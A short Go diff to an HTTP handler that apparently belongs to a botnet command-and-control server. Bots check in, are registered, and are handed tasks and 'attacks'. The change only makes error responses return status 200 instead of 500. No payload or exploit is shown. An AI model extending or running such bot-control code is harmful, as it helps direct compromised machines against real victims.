@@ -13,7 +13,7 @@ func ParseKnock(c *gin.Context) {
 	var bot Bot
 	err := c.BindJSON(&bot)
 	if err != nil {
-		c.JSON(http.StatusInternalServerError, Response{
+		c.JSON(http.StatusOK, Response{
 			Code:    http.StatusInternalServerError,
 			Message: err.Error(),
 			Tasks:   nil,
@@ -25,7 +25,7 @@ func ParseKnock(c *gin.Context) {
 
 	exist, err := isBotExist(bot)
 	if err != nil {
-		c.JSON(http.StatusInternalServerError, Response{
+		c.JSON(http.StatusOK, Response{
 			Code:    http.StatusInternalServerError,
 			Message: err.Error(),
 			Tasks:   nil,
@@ -37,7 +37,7 @@ func ParseKnock(c *gin.Context) {
 	if !exist {
 		err = registerBot(bot)
 		if err != nil {
-			c.JSON(http.StatusInternalServerError, Response{
+			c.JSON(http.StatusOK, Response{
 				Code:    http.StatusInternalServerError,
 				Message: err.Error(),
 				Tasks:   nil,
@@ -52,7 +52,7 @@ func ParseKnock(c *gin.Context) {
 
 	tasks, err := getTasksToDo(bot)
 	if err != nil {
-		c.JSON(http.StatusInternalServerError, Response{
+		c.JSON(http.StatusOK, Response{
 			Code:    http.StatusInternalServerError,
 			Message: err.Error(),
 			Tasks:   nil,
@@ -63,7 +63,7 @@ func ParseKnock(c *gin.Context) {
 	}
 	attacks, err := getAttacksToDo(bot)
 	if err != nil {
-		c.JSON(http.StatusInternalServerError, Response{
+		c.JSON(http.StatusOK, Response{
 			Code:    http.StatusInternalServerError,
 			Message: err.Error(),
 			Tasks:   nil,
